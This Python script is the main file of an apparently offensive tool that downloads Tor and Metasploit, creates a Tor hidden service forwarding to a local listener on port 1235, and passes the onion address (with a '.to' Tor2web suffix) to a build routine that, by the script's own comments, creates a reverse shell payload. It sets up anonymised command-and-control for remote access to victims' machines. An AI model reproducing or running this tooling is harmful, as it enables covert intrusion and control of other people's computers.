import os
import sys
import time
import subprocess
import build
import random
import string
import signal
import hashlib
from stem.control import Controller
import config
from colorama import init, Fore, Style
init(autoreset=True)
bblue = Fore.BLUE + Style.BRIGHT
blue = Fore.RED
bos = "\033[1;37m"

def requirements():
    if os.name == 'nt':
        if not os.path.isdir('C:\\Tor'):
            #print(f'{bblue}[!]{bos} You need msfvenom for create reverse shell.\n{bblue}[!]{bos} If you only want create hidden service lets continue.')
            print(f"{bblue}[!]{bos} Tor expert bundle is downloading..")
            build.download_tor()
        else:
            print(f'{bblue}[*]{bos} Tor expert bundle is already downloaded.')
        if not os.path.isfile('C:\\Tor\\metasploitframework-latest.msi'):
            print(f"{bblue}[+]{bos} Metasploit Framework is downloading..")
            build.download_metasploit()
        else:
            print(f'{bblue}[*]{bos} Metasploit Framework is already downloaded.')
    else:
        req = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if req:
            print(f'{bblue}[!]{bos} Tor package is downloading..')
            subprocess.run(['sudo', 'apt', 'install', 'tor'], stdout=subprocess.PIPE)
        else:
            print(f'{bblue}[*]{bos} Tor expert bundle is exist.')
            subprocess.run(['tor', '--quiet', '&'], stdout=subprocess.PIPE)
        requ = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
        if requ:
            print(f'{bblue}[!]{bos} Unable to find msfvenom.')
            subprocess.run(['sudo', 'apt', 'install', 'metasploit-framework'])
        else:
            print(f'{bblue}[*]{bos} Msfvenom is exist.')

def connection():
    if os.name == 'nt':
        os.chdir('C:\\Tor')
        config.torrc()
        #subprocess.run(['C:\\Tor\\tor.exe', '--service', 'install', '-options', '-f', "C:\\Tor\\torrc"])
        #try: #it can be need install service i dont test anything. if any problem you have run this command.
        print(f"{bblue}[*]{bos} Creating hidden service in C:\Tor\hidden_service")
        p = subprocess.Popen(['C:\\Tor\\tor.exe', '-f', 'C:\\Tor\\torrc'])
        time.sleep(10)
        p.kill()
        with open ('C:\\Tor\\hidden_service\hostname', 'r') as r:
                host = r.read()
                print(f"{bblue}[+]{bos} Successfully: {bblue}{host}{bos}")
                resulhost = host + ".to"
                build.shell(resulhost)
    else:
        with Controller.from_port() as controller:
            controller.authenticate()
        print(f"{bblue}[*]{bos} Tor is running version %s" % controller.get_version())
        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
        try:
            print(f"{bblue}[*]{bos} Creating hidden service in %s" % hidden_service_dir)
            result = controller.create_hidden_service(hidden_service_dir, 80, target_port=1235)
        except:
            print(f"{bblue}[*]{bos} Unable to connect retrying..")
            main()
        if result.hostname:
            print(f"{bblue}[*]{bos} Service is available at %s redirecting to local port 1235" % result.hostname)
            result.hostname = result.hostname + ".to"
            build.shell(result.hostname)

def banner():
    z = """
                            Version 1.0.0
        [+] █████████████████████████████████████████████████████ [+]
                        Coded by github.com/samet-g\n
"""
    print(f"""{bblue}
            .-'''-.                                                  .-'''-.     
           '   _    \                               _______         '   _    \   
         /   /` '.   \            _..._             \  ___ `'.    /   /` '.   \  
        .   |     \  '          .'     '.            ' |--.\  \  .   |     \  '  
     .| |   '      |  '.-,.--. .   .-.   .           | |    \  ' |   '      |  ' 
   .' |_\    \     / / |  .-. ||  '   '  |    __     | |     |  '\    \     / /  
 .'     |`.   ` ..' /  | |  | ||  |   |  | .:--.'.   | |     |  | `.   ` ..' /   
'--.  .-'   '-...-'`   | |  | ||  |   |  |/ |   \ |  | |     ' .'    '-...-'`    
   |  |                | |  '- |  |   |  |`" __ | |  | |___.' /'                 
   |  |                | |     |  |   |  | .'.''| | /_______.'/                  
   |  '.'              | |     |  |   |  |/ /   | |_\_______|/                   
   |   /               |_|     |  |   |  |\ \._,\ '/                             
   `'-'                        '--'   '--' `--'  `"                              
    {bos}""")
    for c in z:
        sys.stdout.write(f"{bblue}{c}")
    sys.stdout.flush()
    time.sleep(0.02)
    
def main():
    banner()
    time.sleep(2)
    requirements()
    time.sleep(3)
    connection()

if __name__ == "__main__":
    main()
